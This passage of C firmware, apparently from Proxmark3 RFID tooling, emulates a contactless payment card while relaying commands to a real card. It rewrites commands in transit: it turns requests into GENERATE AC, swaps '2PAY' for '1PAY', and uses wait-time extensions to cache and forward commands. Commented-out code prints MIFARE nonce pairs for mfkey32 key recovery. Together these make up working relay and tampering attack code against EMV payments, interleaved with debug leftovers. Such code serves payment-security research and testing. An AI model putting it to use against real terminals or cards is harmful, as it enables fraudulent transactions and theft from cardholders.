                //  there are two of this for some reason?? Ach, this one is not at the card read level, that is why.
                if (memcmp(&fci_query[0], receivedCmd, sizeof(fci_query)) == 0 && false) {
                    if (999 >= DBG_EXTENDED) Dbprintf("***** returning fast FCI response...!");
                    //uint8_t modified_response[] = { 0x03, 0x77, 0x0e, 0x82, 0x02, 0x39, 0x80, 0x94, 0x08, 0x18, 0x01, 0x02, 0x01, 0x20, 0x01, 0x04, 0x00, 0x90, 0x00, 0x03, 0xec };
                    //uint8_t modified_response[] = { 0x03, 0x77, 0x0e, 0x82, 0x02, 0x39, 0x80, 0x94, 0x08, 0x18, 0x01, 0x02, 0x01, 0x20, 0x01, 0x04, 0x00, 0x90, 0x00, 0x03, 0xec };
                    EmSendCmd(&fci_template[0], sizeof(fci_template));

                    //for (int i = 0; i < sizeof(fci_template); i++) {
                    //    Dbprintf("%02x ", fci_template[i]);
                    //}

                    continue;
                }

                // We want to modify corrupted request
                if (receivedCmd_len > 5 && receivedCmd[0] != 0x03 && receivedCmd[0] != 0x02 && receivedCmd[1] == 0 && receivedCmd[4] == 0) {
                    Dbprintf("We saw corrupted request... modifying it into a generate ac transaction !!!!");
                    receivedCmd[0] = 0x03;
                    receivedCmd[1] = 0x80;
                    receivedCmd[2] = 0xae;
                    receivedCmd[3] = 0x80;
                    receivedCmd[4] = 0x00;
                    receivedCmd[5] = 0x1d;

                    Dbprintf("***** debug mode... hutton QUITTING NOW... we are here now?");
                    break;

                    for (int i = 0; i < 29; i++) {
                        receivedCmd[6 + i] = receivedCmd[12 + i];
                    }

                    // clear final byte just in case
                    receivedCmd[35] = 0;

                    receivedCmd_len = 35 + 3; // Core command is 35, then there is control code and hte crc

                    Dbprintf("\nthe command has now become:");
                    Dbhexdump(receivedCmd_len, receivedCmd, false);

                    Dbprintf("***** debug mode... QUITTING NOW... we are here now?");
                    break;
                }

                // Seems unlikely
                if (receivedCmd_len >= 9 && receivedCmd[6] == '1' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
                    Dbprintf("We saw 1PA... !!!!");
                }

                // Request more time for 2PAY and respond with a modified 1PAY request
                if (receivedCmd_len >= 9 && receivedCmd[6] == '2' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
                    Dbprintf("We saw 2PA... switching it to 1PAY !!!!");
                    receivedCmd[6] = '1';

                    /*
                    //static uint8_t modified_to_say_2pay[]  = { 0x03, 0x6F, 0x1A, 0x84, 0x0E, 0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53, 0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0xA5, 0x08, 0x88, 0x01, 0x01, 0x5F, 0x2D, 0x02, 0x65, 0x6E, 0x90, 0x00, 0x7B, 0x7D};
                    static uint8_t original_card_response[] =
                            { 0x03, 0x6f, 0x2e, 0x84, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0xa5, 0x1c, 0xbf, 0x0c, 0x19, 0x61, 0x17, 0x4f, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x04, 0x10, 0x10, 0x87, 0x01, 0x01, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x02, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x33, 0x4e};
                    EmSendCmd(original_card_response, sizeof(original_card_response));
                    continue;
                     */

                    //EmSendCmd(extend_resp, 4);

                    //// copy the command and its length
                    //receivedCmd[6] = '1';
                    //memcpy(receivedCmd_copy, receivedCmd, receivedCmd_len);
                    //receivedCmd_len_copy = receivedCmd_len;
                }

                static uint8_t rnd_resp[] = {0xb2, 0x67, 0xc7};
                if (memcmp(receivedCmd, rnd_resp, sizeof(rnd_resp)) == 0) {
                    Dbprintf("We saw bad response... !");
                    continue;
                }

                // We have received the response from a WTX command! Process the cached command at this point.
                if (memcmp(receivedCmd, extend_resp, sizeof(extend_resp)) == 0) {
                    //Dbprintf("We saw wtx response... !");
                    //waiting_wtx_response = false;
                    // Now process pending command!

                    // Special case: if we are about to do a generate AC, we also need to
                    // make a request for pdol...
                    if (receivedCmd_copy[1] == 0x80 && receivedCmd_copy[2] == 0xae) {
                        Dbprintf("We are about to do a generate AC... we need to request PDOL first...");
                        uint8_t pdol_request[] = { 0x80, 0xa8, 0x00, 0x00, 0x02, 0x83, 0x00 };

                        CmdSmartRaw(0xff, &(pdol_request[0]), sizeof(pdol_request), (&receivedCmd_dec[1]));
                    }

                    // This is minus 3 because we don't include the first byte (prepend), plus we don't want to send the
                    // last two bytes (CRC) to the card
                    CmdSmartRaw(receivedCmd_copy[0], &(receivedCmd_copy[1]), receivedCmd_len_copy-3, (&receivedCmd_dec[1]));
                    Dbprintf("Sent delayed command to card...");
                    //EmSendCmd(thirdResponse, sizeof(thirdResponse));
                    continue;
                }

                // Send a request for more time, and cache the command we want to process
                EmSendCmd(extend_resp, 4);

                // copy the command and its length (minus 1???)
                Dbprintf("Caching command for later processing... its length is %d", receivedCmd_len);
                memcpy(receivedCmd_copy, receivedCmd, receivedCmd_len);
                receivedCmd_len_copy = receivedCmd_len;

                continue;
            }
        }  // End Switch Loop
        button_pushed = BUTTON_PRESS();
    }  // End While Loop

    Dbprintf("Completed transaction loop");

    FpgaDisableTracing();

    // NR AR ATTACK
    // mfkey32
    //if (((flags & FLAG_NR_AR_ATTACK) == FLAG_NR_AR_ATTACK) && (999 >= DBG_INFO)) {
    //    for (uint8_t i = 0; i < ATTACK_KEY_COUNT; i++) {
    //        if (ar_nr_collected[i] == 2) {
    //            Dbprintf("Collected two pairs of AR/NR which can be used to extract %s from reader for sector %d:", (i < ATTACK_KEY_COUNT / 2) ? "keyA" : "keyB", ar_nr_resp[i].sector);
    //            Dbprintf("../tools/mfkey/mfkey32 %08x %08x %08x %08x %08x %08x",
    //                     ar_nr_resp[i].cuid,  //UID
    //                     ar_nr_resp[i].nonce, //NT
    //                     ar_nr_resp[i].nr,    //NR1
    //                     ar_nr_resp[i].ar,    //AR1
    //                     ar_nr_resp[i].nr2,   //NR2
    //                     ar_nr_resp[i].ar2    //AR2
    //            );
    //        }
    //    }
    //}

    //// mfkey32 v2
    //for (uint8_t i = ATTACK_KEY_COUNT; i < ATTACK_KEY_COUNT * 2; i++) {
    //    if (ar_nr_collected[i] == 2) {
    //        Dbprintf("Collected two pairs of AR/NR which can be used to extract %s from reader for sector %d:", (i < ATTACK_KEY_COUNT / 2) ? "keyA" : "keyB", ar_nr_resp[i].sector);
    //        Dbprintf("../tools/mfkey/mfkey32v2 %08x %08x %08x %08x %08x %08x %08x",
    //                 ar_nr_resp[i].cuid,  //UID
    //                 ar_nr_resp[i].nonce, //NT
    //                 ar_nr_resp[i].nr,    //NR1
    //                 ar_nr_resp[i].ar,    //AR1
    //                 ar_nr_resp[i].nonce2,//NT2
    //                 ar_nr_resp[i].nr2,   //NR2
    //                 ar_nr_resp[i].ar2    //AR2
    //        );
    //    }
    //}

    if (999 >= DBG_ERROR) {
        Dbprintf("Emulator stopped. Tracing: %d  trace length: %d ", get_tracing(), BigBuf_get_traceLen());
    }

    //if ((flags & FLAG_INTERACTIVE) == FLAG_INTERACTIVE) {  // Interactive mode flag, means we need to send ACK
    //    //Send the collected ar_nr in the response
    //    reply_mix(CMD_ACK, CMD_HF_MIFARE_SIMULATE, button_pushed, 0, &ar_nr_resp, sizeof(ar_nr_resp));
    //}

    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    LEDsoff();
    set_tracing(false);
    BigBuf_free_keep_EM();
}
